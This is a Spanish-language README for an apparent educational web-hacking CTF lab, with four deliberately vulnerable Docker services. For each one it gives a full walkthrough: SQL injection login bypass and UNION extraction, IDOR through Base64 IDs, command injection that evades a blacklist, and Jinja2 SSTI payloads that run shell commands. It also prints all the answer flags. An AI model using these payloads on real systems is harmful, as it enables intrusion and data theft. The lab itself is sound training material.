# 🏴 IntraCorp CTF — Web Hacking 
<div align="center">

![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.11-3776AB?logo=python&logoColor=white)
![Flask](https://img.shields.io/badge/Flask-Latest-000000?logo=flask&logoColor=white)
![Challenges](https://img.shields.io/badge/Challenges-4-critical)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![License](https://img.shields.io/badge/License-MIT-green)

**Plataforma CTF de hacking web con 4 servicios vulnerables, UI profesional y entornos Docker aislados.**  
Empresa ficticia **IntraCorp** — 4 vectores de ataque reales, dificultad media.

</div>

---

## 📋 Tabla de contenidos

- [Requisitos](#requisitos)
- [Instalación](#instalación)
- [Servicios](#servicios)
- [Challenge 01 — SQL Injection](#challenge-01--sql-injection)
- [Challenge 02 — IDOR](#challenge-02--idor)
- [Challenge 03 — Command Injection](#challenge-03--command-injection)
- [Challenge 04 — SSTI](#challenge-04--ssti)
- [Estructura del proyecto](#estructura-del-proyecto)
- [Flags esperadas](#flags-esperadas)
- [Disclaimer](#disclaimer)

---

## Requisitos

| Herramienta | Versión mínima |
|-------------|---------------|
| Docker | 20.x |
| Docker Compose | 2.x |
| Navegador / Burp Suite | Cualquier versión reciente |

## Comandos útiles

### Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/R-Galarza/intracorp-ctf.git
cd intracorp-ctf

# 2. Levantar todos los servicios
docker-compose up -d --build

# 3. Verificar que los contenedores están corriendo
docker-compose ps
```

### Detener

```bash
# 1. Detener todos (conserva contenedores)
docker-compose stop
```
```bash
# 2. Detener uno específico
docker-compose stop challenge4
```

### Eliminar
```bash
# 1.  Detener Y eliminar contenedores (conserva imágenes)
docker-compose down
```
```bash
# 2.  Eliminar contenedores + imágenes del proyecto
docker-compose down --rmi all
```
```bash
# 3.  Eliminar contenedores + imágenes + volúmenes (reset total)
docker-compose down --rmi all -v

```

### Logs
```bash
# 1. Ver logs de todos
docker-compose logs
```
```bash
# 2. logs en tiempo real
docker-compose logs -f
```
```bash
# 3.  Logs de un servicio específico
docker logs intracorp-sqli
docker logs intracorp-cmdi -f
```
```bash
# 4. Reset total + arranque limpio
bashdocker-compose down --rmi all -v
docker-compose up -d --build

```
Una vez levantado, navega a **http://localhost:8000** para ver el índice de challenges.

<div align="center">

![Landing Page](https://github.com/R-Galarza/intracorp-ctf/blob/main/challenge4/Image/Ladding_page.png)

</div>



## Servicios

| Puerto | Servicio | Vulnerabilidad | Flag |
|--------|----------|---------------|------|
| **:8000** | Landing Page | — | — |
| **:8001** | portal.intracorp.local | SQL Injection | `flag{sqli_filter_bypass}` |
| **:8002** | api.intracorp.local | IDOR | `flag{idor_encoded_access}` |
| **:8003** | tools.intracorp.local | Command Injection | `flag{command_injection_blacklist}` |
| **:8004** | billing.intracorp.local | SSTI Jinja2 | `flag{ssti_without_os}` |

---

## Challenge 01 — SQL Injection

**URL:** http://localhost:8001  
**Endpoint vulnerable:** `POST /search` (dentro del portal, tras autenticarse)

### ¿Qué es SQL Injection?

La inyección SQL ocurre cuando una aplicación incorpora datos del usuario directamente en una consulta SQL sin sanitización. El atacante puede alterar la lógica de la consulta, evadir autenticaciones, leer tablas ocultas o ejecutar comandos en el sistema.

### Descripción del challenge

El portal de empleados de IntraCorp tiene:
1. **Login con blacklist débil** — bloquea `delete`, `drop`,`insert`, `--`,  pero NO bloquea `/*`,`/**/`.
2. **Módulo de búsqueda de sneakers** — ejecuta queries directamente sobre la base de datos.

La flag está en la tabla `secrets`. El módulo de búsqueda también tiene una blacklist pero admite técnicas de ofuscación.

### Paso 1 — Bypasear el login

El login bloquea palabras exactas pero no la condición `OR`. Usar:

```
Usuario:   cualquier_cosa
Password:  cn' OR '1'='1
```

Esto genera la query:
```sql
SELECT id, username, role FROM users WHERE username='...' AND password='cn' OR '1'='1'
```
Y devuelve el primer usuario de la tabla (super_user).

### Paso 2 — Extraer la flag con UNION SELECT

Una vez dentro, ir a **Buscar**. El campo de búsqueda ejecuta:


```sql
SELECT id, brand, model, price FROM sneakers WHERE brand LIKE '%INPUT%' OR model LIKE '%INPUT%'
```
```sql 
Ver nombre de base de datos
' UNION SELECT 1,name,3,4,5,6 FROM pragma_database_list /*

```
```sql
Ver tablas de base de datos 
' UNION SELECT 1,name,3,4,5,6 FROM sqlite_master WHERE type='table' /*

```
```sql
Ver columnas de una tabla 
' UNION SELECT 1,name,3,4,5,6 FROM pragma_table_info('users')

```
```sql
Leer datos de una columna
' UNION SELECT 1,username,password,4,5,6 FROM users /*
```
```sql
Para encontrar la flag debe de buscar en la columna flag de la tabla secrets.
cn' UNION SELECT 1, flag, 3, 4,5,6 FROM secrets /*

```
```text
flag{sqli_filter_bypass}

```


### Schema de la base de datos

```
users    → id, username, password, role, email
sneakers → id, brand, model, price, stock, colorway
secrets  → id, flag, note       ← aquí está la flag
```

---

## Challenge 02 — IDOR

**URL:** http://localhost:8002  
**Endpoint vulnerable:** `GET /api/contract?uid=<base64>`

### ¿Qué es IDOR?

El IDOR (Insecure Direct Object Reference) ocurre cuando la aplicación expone referencias a objetos internos sin verificar la autorización del usuario que realiza la solicitud. Aunque el identificador esté codificado o parezca opaco, si el servidor no valida la propiedad del recurso, cualquier usuario puede acceder a datos ajenos.

### Descripción del challenge

El portal de documentos de IntraCorp muestra una lista de contratos. Al iniciar sesión como **jose / jose123**, solo verás un documento abierto (el tuyo). Los demás aparecen como "Restringido".

Al abrir tu contrato, la URL generada tiene este aspecto:

```
GET /api/contract?uid=MQ%3d%3d HTTP/1.1
Host: api.intracorp.local
```

`MQ%3d%3d` es `MQ==` URL-encodeado, que a su vez es el número `1` en Base64.

### Solución

1. **Iniciar sesión:** `jose / jose123`

2. **Abrir el contrato de José** y capturar la solicitud con Burp Suite o inspeccionar en DevTools:
   ```
   GET /api/contract?uid=MQ%3d%3d
   ```

3. **Decodificar el uid:**
   ```
   MQ%3d%3d → URL-decode → MQ== → Base64-decode → 1
   ```

4. **Enumerar otros IDs** — el documento del admin es el ID 4:
   ```
   4 → Base64-encode → NA== → URL-encode → NA%3d%3d
   ```

5. **Enviar la solicitud manipulada:**
   ```
   GET /api/contract?uid=NA%3d%3d
   ```
   O directamente:
   ```
   GET /api/contract?uid=NA==
   ```

6. El servidor no valida que el contrato pertenezca al usuario autenticado y devuelve el documento del administrador con la flag.

### Tabla de encodings

| ID | Base64 | URL-encoded |
|----|--------|-------------|
| 1 (jose) | `MQ==` | `MQ%3d%3d` |
| 2 (laura) | `Mg==` | `Mg%3d%3d` |
| 3 (carlos) | `Mw==` | `Mw%3d%3d` |
| 4 (admin) ← **FLAG** | `NA==` | `NA%3d%3d` |

```
flag{idor_encoded_access}
```

---

## Challenge 03 — Command Injection

**URL:** http://localhost:8003  
**Endpoint vulnerable:** `POST /tools/ping`

### ¿Qué es Command Injection?

La inyección de comandos ocurre cuando la aplicación pasa datos del usuario a funciones del sistema operativo sin sanitización. El atacante puede encadenar comandos arbitrarios aprovechando caracteres especiales del shell. Un filtro de blacklist incompleto es frecuentemente insuficiente.

### Descripción del challenge

La herramienta de diagnóstico ejecuta:

```bash
ping -c 2 <TARGET>
```

La **blacklist bloquea:**
- `;` — separador de comandos
- `&` — ejecución en background
- `|` — pipe
- `$` — variables de shell
- `cat` — comando de lectura (como palabra exacta)

La flag está en `/flag.txt` dentro del contenedor.

### Vectores de bypass

#### Opción A — Newline (`%0A`) como separador de comandos

Un salto de línea termina un comando igual que `;`. El servidor URL-decodifica el input antes de ejecutarlo:

Enviar via `curl` o Burp:
```
target=8.8.8.8%0Ac'a't%20/flag.txt
```

Lo que ejecuta el shell:
```bash
ping -c 2 8.8.8.8
c'a't /flag.txt
```

#### Opción B — `%20` sustituido por espacio usando `%0A`

`cat` está bloqueado como palabra literal. Dividirlo con comillas lo evita:
```
c'a't /flag.txt     ← válido en bash, elude el regex de "cat"
```
```
target=8.8.8.8%0Ac'a't%20/flag.txt
```

#### Opción C — Comando alternativo sin restricción

`head`, `less`, `tail`, `more` no están en la blacklist:
```
target=8.8.8.8%0Ahead%20/flag.txt
```

### Ejemplo con curl

```bash
curl -X POST http://localhost:8003/tools/ping \
  --data-urlencode "target=8.8.8.8
c'a't /flag.txt"
```

```
flag{command_injection_blacklist}
```

---

## Challenge 04 — SSTI (Server-Side Template Injection)

**URL:** http://localhost:8004  
**Endpoint vulnerable:** `POST /invoice` (campo `customer_name`)

### ¿Qué es SSTI?

El SSTI ocurre cuando datos del usuario se renderizan directamente dentro de un motor de plantillas como Jinja2 sin escapado. Esto permite ejecutar expresiones del motor, acceder al entorno Python e incluso ejecutar comandos en el servidor.

### Descripción del challenge

El generador de facturas usa `render_template_string()` de Flask/Jinja2 e incorpora el nombre del cliente sin sanitizar:

```python
template = "Factura para: " + customer_name + " | Monto: $" + amount
render_template_string(template)
```

El filtro **bloquea la cadena `os` sin comillas**, pero Python permite construir strings usando concatenación con comillas.

La flag está en `/home/app/flag.txt`.

### Paso 1 — Confirmar SSTI

Enviar en el campo `customer_name`:
```
{{7*7}}
```
Si el resultado muestra `49` en lugar de `{{7*7}}`, el SSTI está confirmado.

### Paso 2 — Leer la flag sin usar `os`

El filtro bloquea `os` literal. Bypass con comillas que separan la cadena:

**Método A — `'o's'` (comillas simples)**
```
{{ self.__init__.__globals__.__builtins__.__import__('o''s').popen('cat /home/app/flag.txt').read() }}
```

**Método B — `"os"` (comillas dobles en el import)**
```
{{ self.__init__.__globals__.__builtins__.__import__("os").popen('cat /home/app/flag.txt').read() }}
```

**Método C — `lipsum` globals**
```
{{ lipsum.__globals__['__builtins__']['open']('/home/app/flag.txt').read() }}
```

```
flag{ssti_without_os}
```

---

## Estructura del proyecto

```
intracorp-ctf/
├── docker-compose.yml          # Orquestación de servicios
├── README.md                   # Esta guía
├── .gitignore
│
├── landing/                    # Índice visual (:8000)
│   ├── Dockerfile
│   └── app.py
│
├── challenge1/                 # SQL Injection (:8001)
│   ├── Dockerfile
│   └── app.py                  # Login + Sneaker shop + Búsqueda vulnerable
│
├── challenge2/                 # IDOR (:8002)
│   ├── Dockerfile
│   └── app.py                  # Portal de contratos con IDs Base64
│
├── challenge3/                 # Command Injection (:8003)
│   ├── Dockerfile
│   └── app.py                  # Utilidad ping con blacklist bypasseable
│
└── challenge4/                 # SSTI (:8004)
    ├── Dockerfile
    └── app.py                  # Generador de facturas Jinja2
```

---

## Flags esperadas

```
flag{sqli_filter_bypass}          ← CH01 SQL Injection
flag{idor_encoded_access}         ← CH02 IDOR
flag{command_injection_blacklist} ← CH03 Command Injection
flag{ssti_without_os}             ← CH04 SSTI
```

---

## Disclaimer

> Este proyecto es **exclusivamente educativo**. Las vulnerabilidades son **intencionadas** y están contenidas en entornos Docker aislados sin conexión a internet.  

> No usar contra sistemas sin autorización explícita del propietario.  

> El uso indebido de estas técnicas puede tener consecuencias legales.

---

---
<div align="center">
  Hecho para practicas de seguridad web · MIT License
</div>

---
